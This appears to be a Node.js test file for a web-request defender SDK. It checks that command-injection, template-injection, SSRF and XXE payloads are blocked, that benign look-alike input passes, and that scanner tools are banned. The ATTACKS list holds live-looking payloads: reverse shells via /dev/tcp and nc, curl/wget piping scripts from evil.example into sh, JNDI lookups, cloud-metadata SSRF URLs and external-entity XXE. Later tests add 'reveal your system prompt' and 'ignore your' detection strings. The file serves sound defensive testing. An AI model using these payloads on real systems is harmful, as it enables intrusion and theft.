// Second hardening batch: strict command-injection / template-injection / SSRF / XXE rules, the
// attack-tool ban, and the guarantee that inspection stays fast on hostile input.
import assert from 'node:assert/strict';
import { test } from 'node:test';

const sig = await import('./packages/defender-sdk/signatures.mjs');
const { inspect, matchScannerAgent, hasTemplateMarkers, hasHtmlTag, hasLooseSqli, sameLine } = sig;
const { createSelfDefense } = await import('./defender/middleware.mjs');
const { shannonDefender } = await import('./packages/defender-sdk/index.mjs');
const { buildCompositeFilter } = await import('./purple-engine.mjs');
const { classify } = await import('./defender/classify.mjs');

const j = (o) => JSON.stringify(o);

const ATTACKS = [
  ['cmd-injection', '/ping?host=8.8.8.8|cat%20/var/log/auth.log', ''],
  ['cmd-injection', '/', j({ host: 'x; wget http://evil.example/a.sh' })],
  ['cmd-injection', '/', j({ host: 'x && curl -s https://evil.example/x | sh' })],
  ['cmd-injection', '/q?f=a.txt;whoami', ''],
  ['cmd-injection', '/q?f=a|uname -a', ''],
  ['cmd-injection', '/q?f=$(id)', ''],
  ['cmd-injection', '/q?f=$(sleep 10)', ''],
  ['cmd-injection', '/', j({ f: 'x; sleep 10' })],
  ['cmd-injection', '/', j({ f: 'x || ping -c 10 127.0.0.1' })],
  ['cmd-injection', '/', j({ f: 'x; /bin/sh -i' })],
  ['cmd-injection', '/', j({ f: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' })],
  ['cmd-injection', '/', j({ f: 'x; nc -e /bin/sh 10.0.0.1 4444' })],
  ['cmd-injection', '/', j({ f: 'x && powershell -enc AAAA' })],
  ['rce-ssti', '/hello?name={{7*7}}', ''],
  ['rce-ssti', "/hello?name={{7*'7'}}", ''],
  ['rce-ssti', '/hello?name=${7*7}', ''],
  ['rce-ssti', '/hello?name=%23{7*7}', ''],
  ['rce-ssti', '/hello?name=<%= 7*7 %>', ''],
  ['rce-ssti', '/', j({ n: "{{ ''.__class__.__mro__[1].__subclasses__() }}" })],
  ['rce-ssti', '/', j({ n: '{{ self.__init__.__globals__.__builtins__ }}' })],
  ['rce-ssti', '/', j({ n: '${T(java.lang.Runtime).getRuntime().exec("id")}' })],
  ['rce-ssti', '/', j({ n: '{{constructor.constructor("return process")()}}' })],
  ['rce-ssti', '/', j({ n: '${jndi:ldap://evil.example/a}' })],
  ['rce-ssti', '/', j({ n: '${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}' })],
  ['rce-ssti', '/', j({ n: '<#assign ex="freemarker.template.utility.Execute"?new()>' })],
  ['ssrf', '/fetch?url=http://169.254.169.254/latest/meta-data/', ''],
  ['ssrf', '/fetch?url=http://metadata.google.internal/computeMetadata/v1/', ''],
  ['ssrf', '/', j({ url: 'http://100.100.100.200/latest/meta-data' })],
  ['ssrf', '/', j({ url: 'gopher://127.0.0.1:6379/_FLUSHALL' })],
  ['ssrf', '/fetch?url=dict://localhost:11211/stats', ''],
  ['ssrf', '/fetch?url=file:///proc/self/environ', ''],
  ['ssrf', '/fetch?url=http://2130706433/admin', ''],
  ['ssrf', '/fetch?url=http://0x7f000001/', ''],
  ['ssrf', '/fetch?url=http://0177.0.0.1/', ''],
  ['xxe', '/', '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><r>&xxe;</r>'],
  ['xxe', '/', '<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://evil.example/x.dtd"> %ext;]>'],
];

// Ordinary input that each new rule sits closest to. None of it may ever be blocked.
const ORDINARY = [
  ['/products?page=2&sort=price&id', ''],
  ['/products?a=1&id=5&whoami=me', ''],
  ['/', j({ q: 'Design & code; also coffee' })],
  ['/', j({ columns: 'name;id;email' })],
  ['/', j({ q: 'who am I; where do I sleep tonight' })],
  ['/', j({ q: 'I was tired; sleep was good' })],
  ['/', j({ q: 'cats and dogs | cat food reviews' })],
  ['/', j({ q: 'curl up with a book; wget is a tool' })],
  ['/', j({ q: 'ping me later; ping -c is a flag' })],
  ['/', j({ note: 'Use bash -c carefully; sh is fine' })],
  ['/', j({ c: "if (a == 'x' || b) { run(); }" })],
  ['/', j({ c: 'a && b; c || d' })],
  ['/', j({ q: 'see /etc/hosts and /dev/null' })],
  ['/', j({ q: 'Total: ${price} per unit, {{name}} and {{ user.first_name }}' })],
  ['/', j({ q: 'Hello {{customer}}, your order #{order_id} ships *{soon}' })],
  ['/', j({ tpl: '<%= user.name %> has ${count} items' })],
  ['/', j({ q: 'costs $5 (roughly) and $(document).ready(fn)' })],
  ['/', j({ q: 'My java.lang.String question and Runtime errors' })],
  ['/login?redirect_uri=http://localhost:3000/callback', ''],
  ['/login?redirect_uri=http://127.0.0.1:8085/', ''],
  ['/', j({ webhook: 'https://hooks.example.com/services/T000/B000' })],
  ['/', j({ url: 'https://example.com/file.jar', note: 'file: report.pdf' })],
  ['/', j({ sso: 'ldap://dc.example.com:389' })],
  ['/', j({ ip: '169.254.1.1', gateway: '10.0.0.1' })],
  ['/', j({ link: 'file:///home/me/notes.txt' })],
  // Design tools write internal entities into ordinary SVG files.
  [
    '/',
    '<?xml version="1.0"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [ <!ENTITY ns_svg "http://www.w3.org/2000/svg"> ]><svg/>',
  ],
  ['/api/auth/login', j({ email: "o'brien@example.com", password: 'p;w|d&&$(x)' })],
];

test('strict command-injection, template-injection, SSRF and XXE rules block real payloads', () => {
  for (const [cls, url, body] of ATTACKS) {
    const v = inspect(url, body);
    assert.equal(v.enforce, true, `should block: ${url} ${body}`);
    assert.equal(v.cls, cls, `${url} ${body}`);
  }
});

test('the new rules never block ordinary input', () => {
  for (const [url, body] of ORDINARY) {
    assert.equal(inspect(url, body).enforce, false, `must not block: ${url} ${body}`);
  }
});

// ---------- attack tools ----------

const TOOLS = [
  'sqlmap/1.8.4#stable (https://sqlmap.org)',
  'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)',
  'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)',
  'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
  'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)',
  'gobuster/3.6',
  'masscan/1.3 (https://github.com/robertdavidgraham/masscan)',
  '${jndi:ldap://evil.example/a}',
];
const CLIENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'python-httpx/0.27.0',
  'curl/8.5.0',
  'node',
  'Go-http-client/2.0',
  'axios/1.7.2',
  'PostmanRuntime/7.39.0',
  'Stripe/1.0 (+https://stripe.com/docs/webhooks)',
  'UptimeRobot/2.0',
  '',
  undefined,
];

test('attack tools are recognised by User-Agent; browsers, bots and HTTP libraries are not', () => {
  for (const ua of TOOLS) assert.ok(matchScannerAgent(ua), `should match: ${ua}`);
  for (const ua of CLIENTS) assert.ok(!matchScannerAgent(ua), `must not match: ${ua}`);
});

const mkReq = (method, url, { ip = '203.0.113.7', body, ua } = {}) => ({
  method,
  url,
  originalUrl: url,
  path: url.split('?')[0],
  body,
  ip,
  headers: ua === undefined ? {} : { 'user-agent': ua },
  socket: {},
});
const run = (mw, req) => {
  const res = {
    code: null,
    payload: null,
    status(c) {
      this.code = c;
      return this;
    },
    json(p) {
      this.payload = p;
      return this;
    },
  };
  let nexted = false;
  mw(req, res, () => {
    nexted = true;
  });
  return { res, nexted };
};
const BAN = { enabled: true, enforce: true, threshold: 5, windowMs: 60_000, ttlMs: 15 * 60_000 };

test('self-defense: an attack tool is refused and banned on its first request', () => {
  const events = [];
  const d = createSelfDefense({ mode: 'enforce', ban: BAN, onDetection: (e) => events.push(e) });
  const hit = run(d.middleware, mkReq('GET', '/pricing', { ip: '198.51.100.20', ua: TOOLS[0] }));
  assert.equal(hit.res.code, 403);
  assert.equal(hit.nexted, false);
  assert.equal(d.recent()[0].cls, 'scanner-tool');
  assert.ok(events.some((e) => e.type === 'ban' && e.reason === 'scanner-tool' && e.ip === '198.51.100.20'));
  // Changing the header afterwards does not help: the address is banned.
  const after = run(d.middleware, mkReq('GET', '/pricing', { ip: '198.51.100.20', ua: CLIENTS[0] }));
  assert.equal(after.res.code, 403);
  assert.match(after.res.payload.error, /repeat offender/);
  assert.equal(run(d.middleware, mkReq('GET', '/pricing', { ip: '198.51.100.21', ua: CLIENTS[0] })).nexted, true);
  d.stop();
});

test('self-defense: in monitor mode an attack tool is recorded, not refused; and the check can be switched off', () => {
  const monitor = createSelfDefense({ mode: 'monitor', ban: { ...BAN, enforce: false } });
  const seen = run(monitor.middleware, mkReq('GET', '/pricing', { ua: TOOLS[1] }));
  assert.equal(seen.nexted, true);
  assert.equal(monitor.recent()[0].cls, 'scanner-tool');
  monitor.stop();

  const off = createSelfDefense({ mode: 'enforce', ban: BAN, scanners: false });
  assert.equal(run(off.middleware, mkReq('GET', '/pricing', { ua: TOOLS[0] })).nexted, true);
  off.stop();
});

test('sdk: attack-tool blocking is off by default and opt-in', () => {
  const plain = shannonDefender({ mode: 'enforce' });
  assert.equal(run(plain, mkReq('GET', '/', { ua: TOOLS[0] })).nexted, true, 'a customer may run their own scanner');
  plain.stop();
  const opted = shannonDefender({ mode: 'enforce', scanners: true });
  const out = run(opted, mkReq('GET', '/', { ua: TOOLS[0] }));
  assert.equal(out.res.code, 403);
  assert.equal(opted.stats().blocked, 1);
  assert.equal(run(opted, mkReq('GET', '/', { ua: CLIENTS[0] })).nexted, true);
  opted.stop();
});

// ---------- inspection must stay fast on hostile input ----------

test('linear helpers give the same answers as the regexes they replace', () => {
  const template = /\{\{.*\}\}|\$\{.*\}|#\{.*\}|<%.*%>|\*\{.*\}/;
  const html = /<[a-z/!][^>]*>|<\/[a-z]/i;
  const sqli = /%27|'|(--\s)|(\bunion\b.*\bselect\b)|\b(sleep|pg_sleep|benchmark)\s*\(|waitfor\s+delay/i;
  const reveal = /reveal.*(system\s+)?prompt/i;
  const samples = [
    '',
    'plain text with nothing in it',
    '{{name}}',
    '{{ a }',
    '{{\n}}',
    '}}{{',
    'a ${b} c',
    '${\n}',
    '#{x}',
    '<% x %>',
    '%><%',
    '*{x}',
    '{ {x} }',
    '<b>bold</b>',
    '<b',
    'a < b and c > d',
    '<!-- note -->',
    '</a',
    '< a>',
    '1 union select 2',
    'union\nselect',
    'select then union',
    'trade union members select a leader',
    'reunion selected',
    "O'Brien",
    'x -- y',
    'sleep (5)',
    'waitfor  delay',
    'reveal your system prompt',
    'reveal\nthe prompt',
    'prompt reveal',
    'the reveal was prompt',
  ];
  for (const s of samples) {
    assert.equal(hasTemplateMarkers(s), template.test(s), `template: ${JSON.stringify(s)}`);
    assert.equal(hasHtmlTag(s), html.test(s), `html: ${JSON.stringify(s)}`);
    assert.equal(hasLooseSqli(s), sqli.test(s), `sqli: ${JSON.stringify(s)}`);
    assert.equal(sameLine(s, /reveal/i, /prompt/i), reveal.test(s), `reveal: ${JSON.stringify(s)}`);
  }
});

test('a megabyte of hostile input is inspected in well under a second per check', () => {
  // Before this fix a 100KB body of "{{{{…" took over three seconds in one check, and the cost grew
  // with the square of the size — a single request could stall the server for minutes.
  const size = 1_000_000;
  const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
  const hostile = [
    '{{',
    '${',
    '<%',
    '<a ',
    '<x o',
    '<iframe ',
    ' onabc =',
    'union ',
    'reveal ',
    '{{\n',
    'union\n',
    '__class__ ',
    "' or a ",
    '; curl -x ',
    '$(curl a ',
    'ignore your ',
    'javascript:a.b',
    "' \t",
  ].map(fill);
  const match = buildCompositeFilter();
  const budgetMs = 1500; // generous for a slow CI machine; the old behaviour was minutes
  for (const input of hostile) {
    const label = JSON.stringify(input.slice(0, 12));
    let started = performance.now();
    inspect('/x', input);
    assert.ok(performance.now() - started < budgetMs, `SDK inspect() too slow on ${label}`);
    started = performance.now();
    match('/x', input);
    assert.ok(performance.now() - started < budgetMs, `engine filter too slow on ${label}`);
    started = performance.now();
    classify({ source: 'http-proxy', url: '/x', body: input });
    assert.ok(performance.now() - started < budgetMs, `dashboard classify() too slow on ${label}`);
  }
});
